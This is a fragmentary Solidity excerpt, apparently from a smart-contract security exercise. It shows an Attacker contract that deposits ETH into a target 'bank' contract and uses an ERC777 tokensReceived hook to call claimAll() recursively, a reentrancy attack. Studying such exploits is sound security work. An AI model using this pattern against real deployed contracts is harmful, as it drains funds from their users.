...
contract Attacker is AccessControl, IERC777Recipient {
	...
	*/
	function attack(uint256 amt) payable public {
      ...
      require(msg.value == amt, "Incorrect ETH value sent");

        // 1. Deposit ETH into bank
      bank.deposit{value: amt}();
      emit Deposit(amt);

        // 2. Start the first claim which triggers the reentrancy
      bank.claimAll();
	...
	*/
	function tokensReceived(
      ...
      // Ensure the call is from the expected token
      require(msg.sender == address(bank.token()), "Invalid token");

      // Check recursion depth to avoid infinite loop
      if (depth < max_depth) {
          depth += 1;
          bank.claimAll(); // Recursive call
      }
